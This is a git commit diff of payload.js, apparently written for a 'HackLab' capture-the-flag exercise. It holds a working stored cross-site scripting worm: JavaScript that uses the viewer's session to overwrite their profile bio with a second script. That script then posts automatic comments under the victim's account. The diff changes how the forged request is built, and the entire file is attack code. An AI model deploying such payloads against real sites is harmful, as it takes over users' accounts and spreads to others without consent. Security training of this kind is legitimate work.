f7cad062d4d476f5917a31f68e9fd3239c336fe2
iktomy87 <62110740+iktomy87@users.noreply.github.com>
2025-10-04 15:42:58 -0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,11 +1,11 @@
 <script>
-// Cuando Pepe vea este comentario, modificará SU biografía
+// Simula el envío del formulario de perfil
+var formData = new FormData();
+formData.append('bio', '<script>setTimeout(()=>{var fd=new FormData();fd.append("comment","¡Jeni comenta automáticamente desde biografías! CTF HackLab");fetch("/comments",{method:"POST",credentials:"include",body:fd})},1000)</' + 'script>');
+
 fetch('/profile', {
     method: 'POST',
-    credentials: 'include',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-    },
-    body: 'bio=' + encodeURIComponent('<script>fetch("/comments",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"comment=¡Jeni comenta automáticamente! HackLab 2025"})</' + 'script>')
+    credentials: 'include', 
+    body: formData
 });
 </script>
